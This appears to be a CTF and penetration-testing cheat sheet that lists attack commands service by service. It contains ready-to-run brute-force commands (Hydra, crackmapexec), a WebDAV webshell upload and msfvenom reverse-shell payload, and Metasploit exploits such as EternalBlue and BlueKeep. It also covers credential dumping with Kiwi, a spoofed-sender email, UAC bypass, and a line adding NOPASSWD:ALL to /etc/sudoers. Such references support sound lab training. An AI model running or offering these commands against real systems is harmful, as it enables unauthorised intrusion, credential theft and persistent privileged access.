This project often references target IP using the `$TG` expression. You can set the bash variable like: `TG=192.168.X.X`.

This is a good place to start. :grin:
```
sudo nmap -sS -sV -O -Pn $TG
```

| PORT     | STATE       | SERVICE |
| -------- | ----------- | ------- |
| 20/TCP   | [Open](#ftp-port-2021)  | FTP |
| 21/TCP   | [Open](#ftp-port-2021)  | FTPS - FTP over SSL/TLS |
| 22/TCP   | [Open](#ssh-port-22)  | SSH / SFTP |
| 23/TCP   | [Open](#telnet-port-23)  | Telnet |
| 25/TCP   | [Open](#smtp-port-25)  | SMTP |
| 53/UDP   | [Open](#)  | DNS |
| 80/TCP   | [Open](#http-port-80)  | HTTP | 
| 88/TCP   | [Open](#kerberos-port-88)  | Kerberos |
| 123/UDP  | [Open](#)  | NTP |
| 135/TCP  | [Open](#)  | Microsoft RPC Endpoint Mapper |
| 137/UDP  | [Open](#)  | NetBIOS Name Service (NBNS) |
| 138/UDP  | [Open](#)  |	NetBIOS Datagram Service |
| 139/TCP  | [Open](#)  | NetBIOS Session Service (SMB/Samba) |
| 161/UDP  | [Open](#)  | SNMP |
| 389/TCP  | [Open](#)  | LDAP |
| 443/TCP  | [Open](#https-port-443)  | HTTPS |
| 445/TCP  | [Open](#smb-ports-139445)  | SMB/Samba |
| 500/UDP  | [Open](#)  | IKE - VPNs (IPSec) |
| 514/UDP  | [Open](#)  | Syslog |
| 636/TCP  | [Open](#)  | LDAPS (LDAP over SSL) |
| 1433/TCP | [Open](#)  | Microsoft SQL Server |
| 3306/TCP | [Open](#mysql-port-3306)  | MySQL |
| 3389/TCP | [Open](#rdp-port-3389)  | RDP |
| 5985/TCP | [Open](#winrm-port-5985--5986-over-ssl)  | WinRM |
| 5986/TCP | [Open](#winrm-port-5985--5986-over-ssl)  | WinRM over SSL |

Check your MAC address [here](https://www.wireshark.org/tools/oui-lookup.html) (OUI Search)

The `version-intensity` flag can range from 0 (light) to 9 (exhaustive) for various intensity.
```
$ sudo nmap -sV --version-intensity 8 $TG
```

To guess OS more aggressively, you can use:
```
$ nmap -O --osscan-guess $TG
```



## Web App Exploitation
This probably has a custom developed web application which include some web security flaw which must be identified and exploited. The question is: Which security flaw?



### Directory Enumeration

Mandatory checks for `robots.txt` and `security.txt`.
```
curl http://$TG/robots.txt
curl http://$TG/.well-known/security.txt
curl http://$TG/sitemap.xml
curl http://$TG/sitemaps.xml
```

```
dirb $TG # Uses default wordlist
gobuster dir -u $TG -w /usr/share/wordlists/wfuzz/general/common.txt
```

With Extensions
```
dirb $TG -X .bak,.tar.gz,.zip,.sql,.bak.zip
gobuster dir -u $TG -x html,php,js -w /usr/share/wordlists/wfuzz/general/common.txt
```

#### Fuzzzzzzzz
```
ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://$TG/FUZZ
```

### XSS vulnerabilities
Start with common XSS Payloads

### SQL injection
Start with common SQLi Payloads

### Command injection
Some PHP scripts allow command injection like `index.php?cmd=<COMMAND>`.

### Server Enumeration
Usually, we don't have to do this. But, hey! If everything else fails, why not :smirk:


## Cryptography
This often features ciphertexts, cryptographic algorithms (AES, RSA), or cryptographic systems (Diffie-Hellman) which involve several encryption and decryption protocols used to uncover hidden messages or vulnerabilities.

Use [FactoDB](https://factordb.com/) and [Alpertron](https://www.alpertron.com.ar/ECM.HTM) for big integer factorization.

## Steganography

`zsteg`, `stegcracker`

```
steghide extract -sf <filename>
```

```
binwalk <FILENAME>
binwalk -e <FILENAME>  # to extract
binwalk -dd ".*" <FILENAME>  # to force-extract
```


## Binary exploitation
This category often features compiled programs which have a vulnerability allowing a competitor to gain a command shell on the server running the vulnerable program. This often has the user exercising reverse engineering skills as well.

```
xxd <FILENAME>
hexdump <FILENAME>
hexeditor <FILENAME>
```


### Buffer Overflow
Exploiting a buffer overflow (which sometimes has some security mitigations in place) to gain a command shell and read a file.

### Format String
Exploiting a format string vulnerability to gain a command shell and read a file.

## Reverse Engineering
This category often features programs from all operating systems which must be reverse engineered to determine how the program operates. Typically the goal is to get the application to reach a certain point or perform some action in order to achieve a solution.

Ofcouse you can try `IDA Pro` or `Ghidra`. But you can also start with `strings`! :heart_eyes:

[Dogbolt](https://dogbolt.org/) is an online decompiler for files < 2MB. The opposite can be done with [Godbolt](https://godbolt.org/)

### ELF Reversing
### EXE Reversing

### Android APK Reversing

`gplaycli` for installing apks from Google PlayStore. (4+ yrs Old)

[APKiD](https://github.com/rednaga/APKiD) gives you information about how an APK was made. It identifies many compilers, packers, obfuscators, and other
weird stuff.

`apktool`

[bytecode-viewer](https://github.com/Konloch/bytecode-viewer) : Android APK Reverse Engineering Suite

## Programming/Coding
Showcase your supreme coding skills to solve challenges. The problem here will be either time-complexity, space-complexity or both. :sob:

## Forensics
This category often features memory dumps, hidden files, or encrypted data which must be analyzed for information about underlying information.

Start with identifying which file it is. [File signature](https://en.wikipedia.org/wiki/List_of_file_signatures) 101!
```
file <FILENAME> 
```

For memory dumps:
Also check [this](https://noob-atbash.github.io/CTF-writeups/fword-20/forensic/memory) out for a refresher.
```
volatility -f <FILE>  --imageinfo
```

Converting ASCII hexdump output into binary files
```
xxd -r <ASCII-HEXDUMP> <OUTPUT-FILE>
```
Use 'exiftool' to extract EXIF information.

## Networking
This mostly features packet captures (PCAPs) which must be analyzed for information about an underlying surface.
Wireshark FTW!

## OSINT

```
host $TG
whois $TG
whatweb $TG
dnsrecon -d $TG
wafw00f $TG --findall
```

Passive Subdomain enumeration and email (and other info) gathering.
```
sublist3r -d $TG -e google,yahoo
theHarvester -d $TG -b google,linkedin
```


##### DNS Zone Transfer
You do DNS zone transfer on publically accessible DNS servers which could possibly have internal domain/sub-domain DNS records.

Step 1:  Get all DNS name servers of the target domain

```dig ns <target domain>```

Step 2: Check if NS allows zone transfers

```dig axfr @<domain of name server> <target domain>```

*OR*

Use: `dnsenum <target domain>` for automated Zone Transfer

*OR*

Use: `fierce -dns <target domain>` for automated Zone Transfer


## Blockchain


## Miscellaneous
Recursively search the current directory (`.`) and all the files inside for the string "flag".
```
grep -Rnw . -e 'flag'
```

```
find / -name "name_of_file" -type f 2>/dev/null
```

Set Target
```
TG=192.168.XXX.XXX
```

Use [Responder](https://github.com/lgandx/Responder) tool which has built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. Great tool if you need a quick server to catch such connections and even poison them.

```
responder -I <INTERFACE>
```


## 1. Information Gathering and Reconnaissance

[DNS lookup](https://dnschecker.org/all-dns-records-of-domain.php) | [Abuse IPDB](https://www.abuseipdb.com/) | [Shodan](https://www.shodan.io/) | 
[WayBackMachine](https://archive.org/web/) | [VirusTotal](https://www.virustotal.com/gui/home/search) | [App.Any.Run](https://app.any.run/) | [DNSDumpster](https://dnsdumpster.com/)


## 2. Scanning and Enumeration

#### Nmap

Host Discovery

 -sn (No port scan) : This option tells Nmap not to do a port scan after host discovery, and only print out the available hosts that responded to the host discovery probes. This is often known as a “ping scan” or a "ping sweep", and is more reliable than pinging the broadcast address because many hosts do not reply to broadcast queries.

The default host discovery done with -sn consists of an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default. When executed by an unprivileged user, only SYN packets are sent (using a connect call) to ports 80 and 443 on the target. When a privileged user tries to scan targets on a local ethernet network, ARP requests are used unless --send-ip was specified. The -sn option can be combined with any of the discovery probe types (the -P* options) for greater flexibility. If any of those probe type and port number options are used, the default probes are overridden. When strict firewalls           are in place between the source host running Nmap and the target network, using those advanced techniques is recommended. Otherwise hosts could be missed when the firewall drops probes or their responses.


```
sudo nmap -sn <target>

# TCP SYN Ping Scan
nmap -sn -PS <target>

# TCP ACK Ping Scan
nmap -sn -PA <target>

# ARP Ping Scan
nmap -sn -PR <target>

# UDP Ping Scan
nmap -sn -PU <target>

# ICMP Echo Ping Scan:
nmap -sn -PE <target>
```


Port Scanning
```
sudo nmap -sS $TG -vvv -oN Nmap_init.txt
sudo nmap -sS -A $TG -vvv -oN Nmap_init.txt
```


### FTP (Port 20/21)

Check for anonymous login using `ftp-anon` nmap script or go crazy with:
```
nmap -p 21 --script "ftp-*" $TG
```

```
ftp $TG
sftp user@host [-P 2222]
```
Note: You can use commands like `ls`, `pwd`, `cd` and `get`.

Maybe checkout other variants of FTP like `lftp`.


Bruteforcing FTP
```
USER_FILE=/usr/share/wordlists/metasploit/common_roots.txt
PASS_FILE=/usr/share/wordlists/metasploit/unix_passwords.txt
hydra -L $USER_FILE -P $PASS_FILE ftp://$TG
crackmapexec ftp $TG -u $USER_FILE -p $PASS_FILE
```



### SSH (Port 22)
```
ssh <USERNAME>@$TG
```

Got ssh username, but has no password? Try bruteforcing with [Hydra](#bruteforcing-with-hydra)

Got ssh keys (at `~.ssh/id_rsa`)? Try this; 
```
chmod 600 id_rsa
ssh -i id_rsa <USERNAME>@$TG
```

You can also try cracking SSH PRIVATE keys using `john`;
```
ssh2john id_rsa > id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
```

**Metasploit Modules**
```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login          # for username:password bruteforcing
use auxiliary/scanner/ssh/ssh_login_pubkey   # for pub_key:pvt_key login
use auxiliary/scanner/ssh/ssh_enumusers
```


**SCP** <br>
Copy from remote to local;
```
scp -r <USERNAME>@$TG:/remote/path/to/foo /local/bar/
```

Copy from local to remote;
```
scp /local/bar/file USER@REMOTE_IP:/remote/path/to/foo
```

**SSH Tunneling**

Syntax: `ssh -L <LOCAL_PORT>:<TG_IP>:<TG_PORT> <USER>@<SSH_IP>`

```
ssh -L 2222:172.17.0.2:8080 <USERNMAE>@$TG
```

### Telnet (Port 23)

```
telnet $TG
```


### SMTP (Port 25)

```
nc $TG 25
telnet $TG 25
```

```
EHLO example.com
```
ESMTP servers usually responds to `EHLO`. Always prefer `EHLO` if the server supports it — it gives you much more info.
If the server doesn't recognize `EHLO`, fall back to `HELO` (very rare these days).

Verifying user
```
VRFY admin
> 252 2.0.0 admin
```

Sending message
```
MAIL FROM:<test@hacker.com>
RCPT TO:<admin@openmailbox.xyz>
DATA
Subject: test

This is a test message.
.
QUIT
```
OR
```
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s $TG -u "Subject:IMP" -m "Hi root, a fake from admin" -o tls=no
```

Enumerating SMTP users
```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t $TG
msf6> use auxiliary/scanner/smtp/smtp_version
msf6> use auxiliary/scanner/smtp/smtp_enum
```


### HTTP (Port 80)
Refer Web app exploitation



##### WebDAV Exploitation

Step 1: Find the WebDAV endpoint. It would be something like `/webdav/` and you would need a username and password to log in.
```
sudo nmap -script=http-enum $TG -vvv
```

Step 2: Find the username and password using `hydra`.

Step 3: `DAVtest` will help you check if you can 
- Create a directory on the server
- PUT files on the server
- Execute files on the server (webshell attack path)

```
davtest -auth <USERNAME>:<PASSWORD> -url http://victim.com/webdav 
```

Step 4: Run `cadaver` on the server to get a CLI on it.
```
cadaver http://example.com/webdav      # This will prompt you for USERNAME and PASSWORD
dav:/webdav/> ?   # for help

dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
```

You can also use msfvenom to create custom payload:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f asp > webshel.asp
```

Or use a metasploit exploit to automate end-to-end:
```
msf6> exploit(Windows/iis/iis_webdav_upload-asp)
```

Step 5: Enjoy your sweet shell @ http://victim.com/webdav/webshell.asp
Or connect with meterpreter on msfconsole.



```
msf6> use auxiliary/scanner/http/apache_userdir_enum
msf6> use auxiliary/scanner/http/brute_dirs
msf6> use auxiliary/scanner/http/dir_scanner
msf6> use auxiliary/scanner/http/dir_listing
msf6> use auxiliary/scanner/http/http_put
msf6> use auxiliary/scanner/http/files_dir
msf6> use auxiliary/scanner/http/http_login
msf6> use auxiliary/scanner/http/http_header
msf6> use auxiliary/scanner/http/http_version
msf6> use auxiliary/scanner/http/robots_txt
```



### Kerberos (Port 88)
Kerberos is a key authentication service within Active Directory. 


**Kerbrute**
```
/opt/kerbrute/kerbrute --dc $TG -d $TG userenum /path/to/wordlist.lst
```


### SMB (Ports 139/445)

Check for **EternalBlue** in SMBv1
```
msf > use exploit/windows/smb/ms17_010_eternalblue
```


`139/tcp open  netbios-ssn` (ms17-010) [CVE-2017-0143]

> A critical remote code execution vulnerability exists in Microsoft SMBv1


Look for ports 137, 138.
```
nmap -sU --top-ports 25 $TG 
```



Use `rpcclient` to determine whether anonymous connection (null session) is allowed on the samba server or not.
```
rpcclient -U "" -N demo.ine.local
enumdomusers
queryuser <RID>

enumdomgroups
getdompwinfo
getdominfo
```


Use `smbclient` if you have username and password. This will list the shares.
```
smbclient -L $TG -U '<USERNAME>'
```

The `smbclient` command will give a `smb: \>` shell interface pointed to the share, if the authentication was successful.
```
smbclient //$TG/<SHARE-NAME> -U <USERNAME>
```


```
nmap -p445 --script smb-protocols $TG
nmap -p445 --script smb-os-discovery.nse $TG
nmap -p445 --script smb-security-mode $TG
nmap -p445 --script smb-enum-sessions $TG
nmap -p445 --script smb-enum-shares   $TG

nmap -p445 --script smb-server-stats  --script-args smbusername=$UN,smbpassword=$PW $TG
nmap -p445 --script smb-enum-sessions --script-args smbusername=$UN,smbpassword=$PW $TG
nmap -p445 --script smb-enum-shares   --script-args smbusername=$UN,smbpassword=$PW $TG
nmap -p445 --script smb-enum-users    --script-args smbusername=$UN,smbpassword=$PW $TG
nmap -p445 --script smb-enum-domains  --script-args smbusername=$UN,smbpassword=$PW $TG
nmap -p445 --script smb-enum-groups   --script-args smbusername=$UN,smbpassword=$PW $TG
nmap -p445 --script smb-enum-services --script-args smbusername=$UN,smbpassword=$PW $TG

# Enumerating folders
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=$UN,smbpassword=$PW $TG
```


[About IPC$ share](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)
The `IPC$` share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.


**Metasploit**
```
msf6> use auxiliary/scanner/smb/smb_login  # to bruteforce
msf6> use exploit/windows/smb/psexec       # to run commands
```

ImPacket
```
psexec.py Administrator@192.168.0.2 cmd.exe
```



For samba shares, we can use `smbmap`.

```
$ smbmap -H $TG -u <USERNAME> -p <PASSWORD>
$ smbmap -u <USERNAME> -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H $TG
$ smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -Hh 10.1.3.30 -x 'net group "Domain Admins" /domain'
```

Can check for null sessions.
```
enum4linux -a $TG
enum4linux -a -u admin -p password1 $TG
```

Also supports share enumeration (via bruteforcing).
```
enum4linux -s <FULL_PATH_OF_SHARES> -u <USERNAME> -p <PASSWORD>  $TG 
```



### HTTPS (Port 443)

Must check the SSL certificate and look into sections like the `Subject Alt Names`.


### MySQL (Port 3306)

 - auxiliary/scanner/mysql/mysql_version
 - auxiliary/scanner/mysql/mysql_login (bruteforce)
 - auxiliary/admin/mysql/mysql_enum (supports authenticated enumeration)
 - auxiliary/admin/mysql/mysql_sql (to run custom sql query)
 - auxiliary/scanner/mysql/mysql_file_enum
 - auxiliary/scanner/mysql/mysql_hashdump
 - auxiliary/scanner/mysql/mysql_schemadump
 - auxiliary/scanner/mysql/mysql_writable_dirs


### RDP (Port 3389)

RDP scanner
```
msf > use auxiliary/scanner/rdp/rdp_scanner
```

BlueKeep RCE [CVE-2019-0708]
```
msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

```
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:10.10.10.1:3389
```


### WinRM (Port 5985 / 5986 over SSL)


You can use `crackmapexec` to attack {rdp,ssh,mssql,ftp,ldap,winrm,smb} protocols.

```
crackmapexec winrm -u administrator -p /usr/share/wordlists/metasploit/unix_passwords.txt --port 5985  $TG
crackmapexec winrm -u <USERNAME> -p <PASSWORD> -x "systeminfo" --port 5985  $TG
```

Use `evil-winrm.rb` for shell
```
evil-winrm -i 10.5.27.227 -u administrator -p tinkerbell
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
evil-winrm -i 10.10.196.249 -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'
```

```
msf6> use exploit/windows/winrm/winrm_script_exec
```


#### Bruteforcing with Hydra

**HTTP Forms**
```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt $TG http-post-form "/path/to/login:ed=^USER^&pw=^PASS^:F=incorrect" -t 10
```

**HTTP Basic Auth**
```
hydra -l <USERNAME> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $TG http-get /
```

**SSH**
```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt $TG ssh -t 10
```


#### Password cracking

Step 1: Try [CrackStation](https://crackstation.net/) first! Then we can look into others;


**Hash type identification**: `hashid`, `hash-identifier` or we can use [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/).

To list the hash formats supported by John
```
john --list:formats 
```

To crack simple hashes;
```
john input_file --wordlist=/usr/share/wordlists/rockyou.txt --format=<HASH-FORMAT>
```


Find the hash [`MODE`](https://hashcat.net/wiki/doku.php?id=example_hashes) here!
```
hashcat -a 0 -m MODE input_file /usr/share/wordlists/rockyou.txt -O
```

For salted hash, `hashcat` expects the input file to be in the format `<hash>:<salt>`.



## 3. Exploitation

[ExploitDB](https://www.exploit-db.com/)

`msfconsole` is your friend here :smile:


Databases & Workspaces
```
db_status   # Making sure Postgresql DB is good and connected.
workspace -a <NEW_WORKSPACE_NAME>    # --add a new workspace
db_stats
```

Nmap inside Metasploit
```
db_import <NMAP-oX.xml>       # To import nmap scan results
db_nmap -sS -sV -O <TARGET>   # To run nmap inside msfconsole
```

Host commands
```
hosts
services
vulns
loot
creds
analyze
```

Setting RHOSTS
```
hosts -R  
setg RHOSTS <TARGET_IP>  # to set a global variable
```

Routing inside Meterpreter
```
meterpreter > run autoroute -s 192.64.132.2

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
```



Once you got shell using metasploit, try [upgrading the shell](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646).
Background the current shell by typing **Ctrl + z**. Then;
```
use post/multi/manage/shell_to_meterpreter
```
Set the required variables and hit `run`!

`portfwd` command in meterpreter can be used to forward a local port to a remote service.

Syntax: `portfwd add –l <LOCAL-PORT> –p <REMOTE-PORT> –r <TARGET-HOST>`
```
portfwd add –l 3389 –p 3389 –r 172.16.194.191
portfwd delete –l 3389 –p 3389 –r 172.16.194.191
```



Netcat listener on port 4444.
```
nc -nvlp 4444
```
Metasploit listener
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

#### Shell Stabilization

`python -c 'import pty; pty.spawn("/bin/bash")'` <br>
`export TERM=xterm` <br>
[Optional] Hit **Ctrl + Z** and run `raw -echo; fg` <br>


#### Got Shell? IG again!
`whoami` && `id` && `sudo -l` && `cat /etc/*release` && `uname -a`


Few more Post Exploitation tricks:

```
msf > use post/linux/gather/hashdump
set SESSION 1
exploit
```

```
msf > use auxiliary/analyze/crack_linux
set SHA512 true
run
```

```
msf > use post/multi/recon/local_exploit_suggester
```

Credential Dumping using Kiwi (MimiKatz alternative)
```
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
```


## 4. Privilege Escalation


### 4.1 PrivEsc on Windows

Windows Exploit Suggester - Next Generation [here](https://github.com/bitsadmin/wesng)

##### Bypassing UAC 
Bypassing UAC using the [UACME](https://github.com/hfiref0x/UACME) tool. We need to compile this into binaries first! Such a bad day for skript kiddies :(
```
Akagi64.exe 23 C:\Temp\payload.exe
```

##### Token Impersonation
Here, we are looking for `SeImpersonatePrivilege` when we run `getprivs` command.
```
meterpreter > load incognito 
Loading extension incognito...Success.

meterpreter > list_tokens -u
meterpreter > impersonate_token "SYSTEM\Administrator"
```



### 4.2 PrivEsc on Linux

Find **SUID** files! [GTFOBins](https://gtfobins.github.io/)
```
find / -perm -u=s -type f 2>/dev/null
grep -rnw / -e "root"
```

Tinkering with `/etc/sudoers` file.
```
sudo -l
cat /etc/sudoers
echo "username ALL=NOPASSWD:ALL" >> /etc/sudoers
```

**Linux Exploit Suggester** [here](https://github.com/The-Z-Labs/linux-exploit-suggester)
```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

Misconfigured **Cron Jobs** are great!
```
crontab -l
```


Common simple Exploits
```
# SMBv1 EternalBlue
msf > use exploit/windows/smb/ms17_010_eternalblue

# RDP BlueKeep
msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# BadBlue 2.72b
msf > use exploit/windows/http/badblue_passthru

# Linux Shellshock
msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec

# MsHTA vuln
msf > use exploit/windows/misc/hta_server
```

`autopwn` [here](https://github.com/hahwul/metasploit-autopwn)

#### Very Handy Links ;)

- Have a Domain Name? Do a [DNS lookup](https://dnschecker.org/all-dns-records-of-domain.php)!
- [PHP] pentestmonkey/[php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
- Reverse Shell Generator [here](https://www.revshells.com/) FTW!
- [CyberChef](https://gchq.github.io/CyberChef/)
- Have non-salted hashes? Give [CrackStation](https://crackstation.net/) a try!
- Free [WebHooks](https://webhook.site/ ) for all!
- [RequestBin](https://pipedream.com/requestbin)
- [Interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library
- [DNSBin](https://github.com/ettic-team/dnsbin) - The request.bin of DNS request

---

[Markdown Cheatsheet](https://www.markdownguide.org/cheat-sheet/) | [Markdown Emojis](https://gist.github.com/rxaviers/7360908)
